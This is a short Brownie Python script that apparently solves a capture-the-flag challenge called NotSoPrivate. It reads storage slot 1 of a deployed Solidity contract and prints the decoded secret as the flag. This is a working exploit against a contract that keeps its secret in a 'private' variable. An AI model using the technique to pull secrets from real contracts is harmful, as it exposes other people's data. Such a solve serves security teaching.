from brownie import NotSoPrivate, convert, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        NotSoPrivate_contract, owner = deploy()
        contract_address = NotSoPrivate_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    # print(contract_address)
    NotSoPrivate_contract = NotSoPrivate.at(contract_address)
    #print(NotSoPrivate_contract.address)
    # storage = []
    # for i in range(2):
    #     data = web3.eth.get_storage_at(contract_address, i)
    #     storage.append(data.hex())
    print(f"{red}Flag: {green}{convert.to_string(web3.eth.get_storage_at(contract_address, 1)).replace('.','')}{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()
